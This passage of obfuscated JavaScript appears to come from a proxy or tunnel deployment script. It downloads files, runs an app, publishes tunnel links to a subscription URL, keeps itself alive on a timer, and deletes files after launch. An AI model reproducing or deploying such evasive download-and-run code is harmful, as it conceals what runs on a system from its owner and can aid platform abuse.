_0x4477dc=_0x5ba33e;try{fs['existsSync'](_0x2a1e98)&&(fs[_0x4477dc(0x225)](_0x2a1e98)[_0x4477dc(0x214)]()?fs[_0x4477dc(0x1ab)](_0x2a1e98,{'recursive':!![]}):fs[_0x4477dc(0x1e0)](_0x2a1e98));}catch(_0x187b07){}}),console[_0x5ba33e(0x1f8)](),console[_0x5ba33e(0x1dd)](_0x5ba33e(0x19b));},0xea60);}let previousargoDomain='';async function subupload(){if(previousargoDomain&&argoDomain===previousargoDomain){}else{const _0x2534dc=await uploadSubscription(SUB_NAME,UPLOAD_DATA,SUB_URL);generateLinks(),previousargoDomain=argoDomain;}await delay(0xc350),await extractDomains();}async function main(){const _0x29b168=_0x513a25;cleanupOldFiles(),createFolder(FILE_PATH),createFolder(path[_0x29b168(0x1b5)](FILE_PATH,_0x29b168(0x236))),await downloadFiles(),await delay(0x1388),await getipandisp(),await myconfig(),await runapp(),await extractDomains(),generateLinks(),httpserver(),cleanfiles();if(SUB_URL){const _0xfd3a8c=await uploadSubscription(SUB_NAME,UPLOAD_DATA,SUB_URL);KEEPALIVE&&OPENSERVER&&!ARGO_AUTH&&!ARGO_DOMAIN&&(previousargoDomain=argoDomain,setInterval(subupload,intervalInseconds*0x3e8));}KEEPALIVE&&(await keep_alive(),setInterval(keep_alive,intervalInseconds*0x3e8));}main();